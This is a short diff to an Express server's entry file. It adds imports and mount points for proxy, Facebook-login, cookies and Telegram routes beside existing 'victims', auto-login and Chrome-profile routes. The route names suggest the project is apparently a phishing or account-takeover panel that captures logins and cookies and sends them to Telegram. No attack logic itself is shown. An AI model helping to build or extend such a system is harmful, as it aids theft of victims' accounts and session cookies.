@@ -508,6 +508,10 @@ import autoLoginRoutes from "./routes/autoLogin.js";
 import victimControlRoutes from "./routes/victims.js";
 import systemRoutes from "./routes/system.js";
 import authRoutes from "./routes/auth.js";
+import proxyRoutes from "./routes/proxy.js";
+import facebookLoginRoutes from "./routes/facebookLogin.js";
+import cookiesRoutes from "./routes/cookies.js";
+import telegramRoutes from "./routes/telegram.js";
 
 // Initialize Chrome profiles for common platforms (safe - skip when unavailable)
 const initializePlatformProfiles = async () => {
@@ -634,6 +638,10 @@ app.use("/api/access-history", accessHistoryRoutes);
 app.use("/api/auto-login", autoLoginRoutes);
 app.use("/api/victims", victimControlRoutes);
 app.use("/api/system", systemRoutes);
+app.use("/api/proxy", proxyRoutes);
+app.use("/api/facebook", facebookLoginRoutes);
+app.use("/api/cookies", cookiesRoutes);
+app.use("/api/telegram", telegramRoutes);
 // Chrome automation routes will be mounted dynamically after optional modules are initialized
 
 // Authentication middleware
